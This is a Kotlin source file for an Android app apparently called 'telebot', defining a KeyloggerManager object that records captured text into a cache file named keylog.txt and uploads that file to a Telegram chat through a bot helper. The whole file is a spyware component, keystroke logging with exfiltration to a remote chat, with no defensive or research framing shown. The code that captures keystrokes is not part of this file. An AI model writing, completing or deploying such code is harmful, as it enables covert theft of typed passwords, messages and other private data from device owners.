package com.example.telebot

import android.content.Context
import java.io.File
import kotlinx.coroutines.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody

object KeyloggerManager {
    private var isLogging = false
    private var logFile: File? = null

    fun start(context: Context) {
        if (isLogging) return
        isLogging = true
        logFile = File(context.cacheDir, "keylog.txt")
        logFile?.writeText("") // Clear previous logs
    }

    fun stop() {
        isLogging = false
    }

    fun log(context: Context, text: String) {
        if (!isLogging) return
        try {
            logFile?.appendText("$text\n")
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    fun sendLog(context: Context, chatId: String) {
        val file = logFile ?: return
        if (file.exists()) {
            TelegramBotManager.sendDocument(chatId, file)
        }
    }
}
